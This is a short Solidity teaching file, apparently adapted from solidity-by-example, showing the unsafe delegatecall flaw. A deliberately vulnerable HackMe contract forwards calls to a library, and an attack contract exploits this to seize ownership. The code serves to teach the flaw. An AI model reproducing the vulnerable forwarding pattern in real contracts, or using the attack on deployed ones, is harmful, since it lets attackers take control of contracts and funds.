// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;  
//pragma solidity ^0.8.0;                               
// Resources: https://solidity-by-example.org/hacks/delegatecall/


contract Lib {                                  // Check: This contract is kind of (B.0, B.1, ... contract)
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {                                // Check: This contract is the main one (A contract)                 
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {                // Check: pwn() doesn't exist, fallback function is executed
        address(lib).delegatecall(msg.data);
    }
}

contract Attack_UnsafeDelegateCall1 {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public returns (bool sent) {
        (sent, ) = hackMe.call(abi.encodeWithSignature("pwn()"));  // We are calling HackMe contract and due to pwn() doesn't exist, fallback function is executed
                                                                  // Also we have: call msg.sender == address(this) & msg.data == abi.encode ...
        
        // Finally, because of fallback() function use delegatecall(), the variable owner inside HackMe will be change by pwn() inside Lib.

    }
}

